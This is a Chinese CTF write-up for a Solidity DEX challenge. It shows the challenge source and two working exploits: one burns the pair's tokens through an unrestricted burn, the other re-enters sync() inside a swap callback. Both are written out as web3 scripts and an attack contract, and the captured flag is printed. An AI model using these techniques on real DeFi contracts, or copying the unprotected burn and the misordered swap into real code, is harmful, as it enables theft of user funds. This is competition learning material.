# HappyFactory

## 源码

Happy.sol

```js
pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IERC20 {
    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract ERC20 is Context, IERC20 {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol) public {
        _name = name;
        _symbol = symbol;
        _decimals = 18;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    /**
     * @dev See {IERC20-totalSupply}.
     */
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {IERC20-balanceOf}.
     */
    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].add(addedValue)
        );
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spender,
            _allowances[_msgSender()][spender].sub(
                subtractedValue,
                "ERC20: decreased allowance below zero"
            )
        );
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].sub(
            amount,
            "ERC20: transfer amount exceeds balance"
        );
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _balances[account] = _balances[account].sub(
            amount,
            "ERC20: burn amount exceeds balance"
        );
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _setupDecimals(uint8 decimals_) internal {
        _decimals = decimals_;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract Token is ERC20("Token", "T"), Ownable {
    function mint(address _to, uint256 _amount) public onlyOwner {
        _mint(_to, _amount);
    }

    function burn(address _from, uint256 _amount) public {
        _burn(_from, _amount);
    }
}

interface IHappyFactory {
    event PairCreated(
        address indexed token0,
        address indexed token1,
        address pair,
        uint256
    );

    function feeTo() external view returns (address);

    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);

    function allPairs(uint256) external view returns (address pair);

    function allPairsLength() external view returns (uint256);

    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function setFeeTo(address) external;

    function setFeeToSetter(address) external;
}

interface IHappyPair {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    event Mint(address indexed sender, uint256 amount0, uint256 amount1);
    event Burn(
        address indexed sender,
        uint256 amount0,
        uint256 amount1,
        address indexed to
    );
    event Swap(
        address indexed sender,
        uint256 amount0In,
        uint256 amount1In,
        uint256 amount0Out,
        uint256 amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint256);

    function factory() external view returns (address);

    function token0() external view returns (address);

    function token1() external view returns (address);

    function getReserves()
        external
        view
        returns (
            uint112 reserve0,
            uint112 reserve1,
            uint32 blockTimestampLast
        );

    function price0CumulativeLast() external view returns (uint256);

    function price1CumulativeLast() external view returns (uint256);

    function kLast() external view returns (uint256);

    function mint(address to) external returns (uint256 liquidity);

    function burn(address to)
        external
        returns (uint256 amount0, uint256 amount1);

    function swap(
        uint256 amount0Out,
        uint256 amount1Out,
        address to,
        bytes calldata data
    ) external;

    function skim(address to) external;

    function sync() external;

    function initialize(address, address) external;
}

interface IHappyERC20 {
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

    function decimals() external pure returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);

    function PERMIT_TYPEHASH() external pure returns (bytes32);

    function nonces(address owner) external view returns (uint256);

    function permit(
        address owner,
        address spender,
        uint256 value,
        uint256 deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
}

contract Happy {
    event tokenA_tokenB(address, address);
    IHappyFactory factory =
        IHappyFactory(address(0xA2A21Fe2fD692b63Df06ECd5b0a783323B4eae36));

    function setup() public returns (address, address) {
        Token tokenA = new Token();
        Token tokenB = new Token();
        address pair = factory.createPair(address(tokenA), address(tokenB));
        tokenA.mint(pair, 10 ether);
        tokenB.mint(pair, 10 ether);
        IHappyPair(pair).sync();
        tokenA.mint(msg.sender, 1 ether);
        emit tokenA_tokenB(address(tokenA), address(tokenB));
        return (address(tokenA), address(tokenB));
    }
}

contract Greeter {
    address happy_contract;
    address public tokenA;
    address public tokenB;
    address deployer;

    constructor() public {
        happy_contract = address(0x2d55bF802F341F969F777F94f7A39604133BE4F6);
        (tokenA, tokenB) = Happy(happy_contract).setup();
        deployer = msg.sender;
    }

    function airdrop() public {
        IERC20(tokenA).transfer(msg.sender, 1 ether);
    }

    function isSolved() public view returns (bool) {
        return IERC20(tokenB).balanceOf(deployer) >= 1 ether;
    }
}

```

## 题解

### 解法一

仔细观察发现Token的burn函数没有onlyOwner的修饰符，意味着任何人都能调用burn，销毁任意账户的任意余额

那么就很简单了

刚开始池子里A:B=10:10，由于手续费的存在，1个A换不出1个B

但是可以调用burn把pair的A烧掉一些，比如烧掉9个A，然后sync更新池子的余额

再调用swap，由于A:B=1:10，A更贵，空投撸一个A，用1个A换1个B绰绰有余

python脚本  [ABI Encoding Service Online for Solidity Smart Contracts by HashEx](https://abi.hashex.org/) 可以快速构造函数调用的data

```python
# Greeter: 0x6de65215A68985983047415a86934170AcC3016f
# tokenA: 0x7A3f0747B39Ed6B81725Bb9BC5162b28799BE113
# tokenB: 0xC3678cD5F12a9ED78538092732060e90C43481f0
# IHappyFactory: 0xA2A21Fe2fD692b63Df06ECd5b0a783323B4eae36
# IHappyPair: 0xDeD5cE390eFf61af3d22bE8fD56799ac990b55ee
# [+] flag: rwctf{mVsdeUeKM6jU4myiTCsoQhpdjTKxJmRM}

from web3 import Web3, HTTPProvider

web3 = Web3(HTTPProvider('http://118.31.7.155:8545'))
print(web3.isConnected())
account = web3.eth.account.from_key('xxx')
print(account.address)

gas_price=5
gas_limit=500000

def get_raw_tx(to, data):
    rawTx = {
        'from': account.address,
        'to': to,
        'nonce': web3.eth.getTransactionCount(account.address),
        'gasPrice': web3.toWei(gas_price, 'gwei'),
        'value': web3.toWei(0, 'ether'),
        'gas': gas_limit,
        'data': data,
        'chainId': 1712
    }
    return rawTx

def deploy(rawTx):
    signedTx = web3.eth.account.signTransaction(rawTx, private_key=account.privateKey)
    hashTx = web3.eth.sendRawTransaction(signedTx.rawTransaction).hex()
    receipt = web3.eth.waitForTransactionReceipt(hashTx)
    print(receipt)
    return receipt

if __name__ == '__main__':
    # get airdrop
    deploy(get_raw_tx(to='0x6de65215A68985983047415a86934170AcC3016f', data='3884d635'))

    # burn
    deploy(get_raw_tx(to='0x7A3f0747B39Ed6B81725Bb9BC5162b28799BE113', data='9dc29fac000000000000000000000000ded5ce390eff61af3d22be8fd56799ac990b55ee0000000000000000000000000000000000000000000000007ce66c50e2840000'))

    # sync
    deploy(get_raw_tx(to='0xDeD5cE390eFf61af3d22bE8fD56799ac990b55ee', data='fff6cae9'))

    # send to pair
    deploy(get_raw_tx(to='0x7A3f0747B39Ed6B81725Bb9BC5162b28799BE113', data='a9059cbb000000000000000000000000ded5ce390eff61af3d22be8fd56799ac990b55ee0000000000000000000000000000000000000000000000000de0b6b3a7640000'))

    # swap
    deploy(get_raw_tx(to='0xDeD5cE390eFf61af3d22bE8fD56799ac990b55ee', data='022c0d9f00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000de0b6b3a76400000000000000000000000000003862a234158fae15f092d135cecc2d12691af7bb00000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000'))
```

### 解法二

主要看pair的swap函数有没有错误

正常的pair合约swap

```js
function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external lock {
    require(amount0Out > 0 || amount1Out > 0, "UniswapV2: INSUFFICIENT_OUTPUT_AMOUNT");

    (uint112 _reserve0, uint112 _reserve1, ) = getReserves();
    require(amount0Out < _reserve0 && amount1Out < _reserve1, "UniswapV2: INSUFFICIENT_LIQUIDITY");

    uint256 balance0;
    uint256 balance1;
    {
        // scope for _token{0,1}, avoids stack too deep errors
        address _token0 = token0;
        address _token1 = token1;
        require(to != _token0 && to != _token1, "UniswapV2: INVALID_TO");
        if (amount0Out > 0) IERC20(_token0).safeTransfer(to, amount0Out);
        if (amount1Out > 0) IERC20(_token1).safeTransfer(to, amount1Out);
        if (data.length > 0)
            IUniswapV2Callee(to).uniswapV2Call(msg.sender, amount0Out, amount1Out, data);
        balance0 = IERC20(_token0).balanceOf(address(this));
        balance1 = IERC20(_token1).balanceOf(address(this));
    }
    uint256 amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;
    uint256 amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;
    require(amount0In > 0 || amount1In > 0, "UniswapV2: INSUFFICIENT_INPUT_AMOUNT");
    {
        // scope for reserve{0,1}Adjusted, avoids stack too deep errors
        uint256 balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(3));
        uint256 balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(3));
        require(balance0Adjusted.mul(balance1Adjusted) >= uint256(_reserve0).mul(_reserve1).mul(1000 ** 2), "UniswapV2: K");
    }

    _update(balance0, balance1, _reserve0, _reserve1);
    emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);
}
```

这是题目合约的swap函数

```js
function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external lock {
    require(amount0Out > 0 || amount1Out > 0, "Konoha: INSUFFICIENT_OUTPUT_AMOUNT");

    uint256 balance0;
    uint256 balance1;
    {
        // scope for _token{0,1}, avoids stack too deep errors
        address _token0 = token0;
        address _token1 = token1;
        require(to != _token0 && to != _token1, "Konoha: INVALID_TO");
        if (amount0Out > 0) _safeTransfer(_token0, to, amount0Out); // optimistically transfer tokens
        if (amount1Out > 0) _safeTransfer(_token1, to, amount1Out); // optimistically transfer tokens
        if (data.length > 0)
            IKonohaCallee(to).KonohaCall(msg.sender, amount0Out, amount1Out, data);
        balance0 = IERC20(_token0).balanceOf(address(this));
        balance1 = IERC20(_token1).balanceOf(address(this));
    }

    (uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings
    require( amount0Out < _reserve0 && amount1Out < _reserve1, "Konoha: INSUFFICIENT_LIQUIDITY");

    uint256 amount0In = balance0 > _reserve0 - amount0Out ? balance0 - (_reserve0 - amount0Out) : 0;
    uint256 amount1In = balance1 > _reserve1 - amount1Out ? balance1 - (_reserve1 - amount1Out) : 0;
    require(=amount0In > 0 || amount1In > 0, "Konoha: INSUFFICIENT_INPUT_AMOUNT");
    {
        // scope for reserve{0,1}Adjusted, avoids stack too deep errors
        uint256 balance0Adjusted = balance0.mul(1000).sub(amount0In.mul(25));
        uint256 balance1Adjusted = balance1.mul(1000).sub(amount1In.mul(25));
        require(balance0Adjusted.mul(balance1Adjusted) >= uint256(_reserve0).mul(_reserve1).mul(1000**2), "Konoha: K");
    }

    _update(balance0, balance1, _reserve0, _reserve1);
    emit Swap(msg.sender, amount0In, amount1In, amount0Out, amount1Out, to);
}
```

可以看到

```js
(uint112 _reserve0, uint112 _reserve1, ) = getReserves(); // gas savings
require( amount0Out < _reserve0 && amount1Out < _reserve1, "Konoha: INSUFFICIENT_LIQUIDITY");
```

这两句获取储备记录值`Reserves`的位置换到了下面，发生在 发送代币给指定账户并外部调用 之后

同时题目合约 `sync()` 函数没有lock的修饰符，可以在过程中调用，正好可以被我们利用

具体过程如下，先airdrop拿到一个tokenA，这个A先不用，直接swap一个B

在过程中，外部调用pair合约的 sync() 函数更新Reserves 的值，这样 Reserves 的值就是A:B=10:9

然后再把一个A转给pair，这样pair获取balance的时候就是A:B=11:9，能够通过K值检测，这样就成功换出1个B

构造的攻击合约

```js
pragma solidity ^0.8.0;
import "./Happy.sol";
contract Exp {
    Greeter public greeter;
    IHappyPair public pair;
    IHappyFactory public factory;
    address public tokenA;
    address public tokenB;

    constructor(address _greeter) {
    }

    function hack(address _greeter, address _deployer) public {

        greeter = Greeter(_greeter);
        tokenA = greeter.tokenA();
        tokenB = greeter.tokenB();

        greeter.airdrop();

        (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        factory = IHappyFactory(address(0xA2A21Fe2fD692b63Df06ECd5b0a783323B4eae36));
        pair = IHappyPair(factory.getPair(token0, token1));

        if (tokenA == token0) {
            pair.swap(0, 1 ether, address(this), "0x1111");
        } else {
            pair.swap(1 ether, 0, address(this), "0x1111");
        }

        Token(tokenB).transfer(_deployer, 1 ether);
    }

    function HappyCall(	//这里的函数名需要自己猜测，题目合约都是interface形式，没有给出外部调用的函数名
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) public {
        pair.sync();
        Token(tokenA).transfer(address(pair), 1 ether);
    }

}
```

python调用脚本

```python
# [+] contract address: 0x5C066F64fd85CB3062536Db26AD0C80306c80951
# [+] flag: rwctf{mVsdeUeKM6jU4myiTCsoQhpdjTKxJmRM}

from web3 import Web3, HTTPProvider
import json
web3 = Web3(HTTPProvider('http://118.31.7.155:8545'))
print(web3.isConnected())
account = web3.eth.account.from_key('xxx')
print(account.address)

gas_price=5
gas_limit=500000

with open('exp.bin', 'r') as f:
    code = f.read()
with open('exp.abi', 'r') as f:
    abi = json.load(f)

newContract  = web3.eth.contract(abi=abi,bytecode=code)
construct_txn = newContract.constructor("0x5C066F64fd85CB3062536Db26AD0C80306c80951").buildTransaction({
    'from': account.address,
    'nonce': web3.eth.getTransactionCount(account.address),
    'gas': 5000000,
    'gasPrice': web3.toWei(gas_price, 'gwei')
})

signed = account.signTransaction(construct_txn)
tx_id = web3.eth.sendRawTransaction(signed.rawTransaction)
print(tx_id.hex())

tx_receipt = web3.eth.waitForTransactionReceipt(tx_id.hex())
print(tx_receipt.contractAddress)
# 0xE08edDd2d4904F1CFb073c030d2D29fC0812d2c2

def get_raw_tx(to, data):
    rawTx = {
        'from': account.address,
        'to': to,
        'nonce': web3.eth.getTransactionCount(account.address),
        'gasPrice': web3.toWei(gas_price, 'gwei'),
        'gas': gas_limit,
        'data': data,
        'chainId': 1712
    }
    return rawTx

def deploy(rawTx):
    signedTx = web3.eth.account.signTransaction(rawTx, private_key=account.privateKey)
    hashTx = web3.eth.sendRawTransaction(signedTx.rawTransaction).hex()
    receipt = web3.eth.waitForTransactionReceipt(hashTx)
    print(receipt)
    return receipt

exp_address = tx_receipt.contractAddress
deploy(get_raw_tx(to=exp_address, data='47ae43180000000000000000000000005c066f64fd85cb3062536db26ad0c80306c80951000000000000000000000000b9989f1abc9d5763bed93fd5a853d99f78ac70d1'))
```

